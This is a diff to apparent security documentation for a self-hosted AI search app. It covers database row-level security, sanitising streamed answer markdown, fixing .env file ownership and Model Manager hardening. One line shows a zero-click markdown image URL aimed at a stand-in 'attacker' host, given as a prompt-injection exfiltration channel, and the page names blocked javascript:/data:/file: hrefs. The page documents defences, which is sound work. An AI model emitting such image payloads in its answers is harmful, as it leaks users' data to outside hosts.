@@ -108,11 +108,15 @@ Cross-user isolation lives in Postgres, not only in app code:
 - RLS only binds a **non-owner** role. The runtime connects through `DATABASE_RESTRICTED_URL`
   as **`app_user`** (NOSUPERUSER, NOBYPASSRLS). `fleet-boot/create-app-user.sh <pg-container>`
   creates it and verifies the flags.
-- **Fail-fast guard** (`lib/db/index.ts`): at boot the app queries its own `rolsuper` and
-  `rolbypassrls`. If `ENABLE_AUTH=true` and the role can bypass RLS, it **exits** so the
+- **Fail-fast guard** (`lib/db/index.ts:98-139`): at boot the app queries its own `rolsuper`
+  and `rolbypassrls`. If `ENABLE_AUTH=true` and the role can bypass RLS, it **exits** so the
   container crash-loops loudly instead of quietly serving every user's data. This matters
   because the base compose **defaults** `DATABASE_RESTRICTED_URL` to the owner connection, so a
   wrong-worktree or missing-overlay `compose up` would otherwise boot green with RLS off.
+  **Gap:** the guard checks for the literal `'true'` (`lib/db/index.ts:98`), while the rest of
+  the app treats an **unset** `ENABLE_AUTH` as auth on. With the variable unset, logins are
+  required but the guard is off. No current stack is affected, because every compose file sets
+  it; see [known issues](/history/known-issues#rls-guard-ignores-an-unset-enable-auth).
 - The owner client `dbAdmin` is used only for token-gated system paths: the ingest worker API,
   the recall backfill and the upload-expiry sweep.
 
@@ -172,6 +176,14 @@ following it (max 5 redirects). It fetches search-result URLs, not user-named on
 
 - **Answer markdown** renders through **Streamdown** with its default rehype plugins
   (raw HTML → `rehype-sanitize` default schema → harden) in `components/message.tsx`.
+- **Half-streamed links are not a reason to loosen that chain.** Since 2026-09-25 an unfinished
+  citation anchor at the stream tail is dropped before rendering (`stripIncompleteCitationTail`,
+  `lib/utils/citation.ts:380`), and Streamdown's `remend` step shows any other unfinished link
+  as plain text (`linkMode: 'text-only'`) instead of completing it with a placeholder
+  `streamdown:` href. That placeholder was what sanitize stripped and harden labelled
+  "[blocked]". Sanitize and harden themselves are unchanged, so `javascript:`, `data:` and
+  `file:` hrefs are still removed. Details:
+  [frontend › half-streamed links](/request-lifecycle/frontend#blocked-flash).
 - **Images in answer markdown are not auto-loaded.** `AnswerImage` renders them as click-through
   links. A zero-click `![](https://attacker/?d=…)` is a prompt-injection exfiltration channel.
   Real images (generated images, search thumbnails, news) render through their own components.
@@ -230,8 +242,9 @@ defence in depth.
 
 ## Secrets management
 
-- Secrets live in each worktree's `.env` (gitignored, mode **0600**): `ask-prod/.env`,
-  `ask/.env` and `ask-flow/.env`. Ingestor secrets are in `ingestor/.env`, `.env.staging` and
+- Secrets live in each worktree's `.env` (gitignored, mode **0600**, owner `nightfury`):
+  `ask-prod/.env`, `ask/.env` and `ask-flow/.env`. Check with `stat -c '%U:%G %a' .env`; see the
+  warning below for prod. Ingestor secrets are in `ingestor/.env`, `.env.staging` and
   `.env.lab`. The reranker's are in `reranker-qwen/.env`. Model-manager's password is in its
   `secrets.env`. Prod `.env` is best edited through [Model Manager](/infrastructure/services#model-manager).
   Every change needs a **container recreate** (`--force-recreate`), because env is injected at
@@ -250,6 +263,29 @@ per env against one account quota. The fix is operational: generate distinct per
 app and its ingestor **must** match within each env. Also **split** the advanced-search token
 from the ingest token (a small code change, not yet made): `/api/advanced-search` reusing
 `INGEST_API_TOKEN` means the app's own search credential can also read files.
+:::
+
+::: danger Prod `.env` rewritten as `root:root 0644` (2026-09-25; code fixed, file needs a hand repair)
+The Model Manager runs as root. Until 2026-09-25 its atomic write replaced `.env` with a new
+root-owned file at the umask default, and an apply that day turned prod's
+`nightfury:nightfury 0600` `.env` into `root:root 0644`. The fix (lab `d105bc7e`, running since
+the 2026-09-25 rebuild) makes every write (apply and restore) **preserve the file's existing
+owner and mode**: the temp file is created exclusively at no broader than 0600, chowned and
+chmodded on its descriptor to match the original, fsynced, then renamed. Backups
+(`.env.bak.<ISO>`) are always 0600 and owned like `.env`, and a missing `.env` is created 0600.
+Details: [Model Manager › file ownership and mode](/infrastructure/model-manager#file-ownership-and-mode).
+
+Because the fix **keeps whatever it finds**, a file already damaged by the older build stays
+damaged. Repair it once by hand and verify:
+
+```bash
+cd /home/nightfury/selfhosted/ask-prod
+sudo chown nightfury:nightfury .env && sudo chmod 600 .env
+stat -c '%U:%G %a' .env        # expect nightfury:nightfury 600
+```
+
+On 2026-09-25, after the fixed build was running, prod's `.env` still read `root:root 644`
+([known issue](/history/known-issues#prod-env-left-root-root-0644)).
 :::
 
 ::: tip World-readable env backups (observed 2026-09-22, since fixed)
@@ -271,7 +307,7 @@ scheduled for rotation. See runbook section B.
 - **Calculator:** input capped at 512 characters, and power towers (`9^9^9^9`) are rejected, so
   mathjs can't stall the single event loop. There's no hard synchronous timeout. That would need
   a worker thread.
-- **Model-manager** (hardened 2026-09-24, see [Model Manager](/infrastructure/model-manager#authentication)):
+- **Model-manager** (hardened 2026-09-24 and 2026-09-25, see [Model Manager](/infrastructure/model-manager#authentication)):
   - Sessions are a random id per login (`<id>.<issuedAt>.<hmac>`), allowlisted in a server-side
     store with a 24 h expiry. Logout revokes the session; recreating the container or changing the
     HMAC key logs everyone out. Previously the cookie value was the same for every login and stayed
@@ -281,7 +317,14 @@ scheduled for rotation. See runbook section B.
     `<env>.bak.<ISO stamp>`, currently listed), so `../` paths and arbitrary files cannot be
     copied over prod's `.env`. It snapshots the current `.env` before restoring.
   - A secret can be cleared only through an explicit **Clear this secret** action, and never for a
-    var marked `required` (none is marked yet; see the warning on the Model Manager page).
+    var marked `required` (six core variables are, see
+    [Model Manager](/infrastructure/model-manager#how-secrets-are-handled)).
+  - Every `.env` write keeps the file's owner and mode, and backups are 0600 (2026-09-25, see
+    above).
+  - Boolean switches write what the app honours: the kill switches `RECALL_ENABLED`,
+    `MEMORY_ENABLED` and `OLLAMA_SEARCH_ENABLED` are written `on`/`off`, and `false` is rejected
+    because the app reads it as on. Before 2026-09-25 the tool could not turn them off
+    ([boolean switches](/infrastructure/model-manager#boolean-switches)).
 
 ## Ops runbook summary
 
